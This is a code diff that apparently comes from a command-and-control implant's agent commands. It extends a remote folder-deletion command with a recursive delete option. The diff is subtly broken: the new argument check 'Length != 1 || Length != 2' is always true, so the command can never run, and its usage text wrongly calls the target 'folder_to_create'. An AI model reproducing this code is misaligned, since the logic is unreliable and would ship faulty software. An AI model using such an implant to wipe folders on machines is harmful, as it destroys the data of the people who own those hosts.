@@ -14,15 +14,22 @@ namespace Agent.Commands
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
             string path;
-            if (task.SplittedArgs.Length != 0)
+            if (task.SplittedArgs.Length != 1 || task.SplittedArgs.Length != 2)
             {
-                result.Result = $"Usage : {this.Name} folder_to_create";
+                result.Result = $"Usage : {this.Name} folder_to_create [recurse (true|false)]";
                 return;
             }
-                
-            path = task.SplittedArgs[0];
 
-            Directory.Delete(path);
+            path = task.SplittedArgs[0];
+            bool recurse = false;
+            if (task.SplittedArgs.Length > 1)
+                if (!bool.TryParse(task.SplittedArgs[1], out recurse))
+                {
+                    result.Result = $"Usage : {this.Name} folder_to_create [recurse (true|false)]";
+                    return;
+                }
+
+            Directory.Delete(path, recurse);
             if (!Directory.Exists(path))
             {
                 result.Result = $"{path} deleted";
@@ -31,5 +38,7 @@ namespace Agent.Commands
 
             result.Result = $"Failed to delete {path}";
         }
+
+
     }
 }
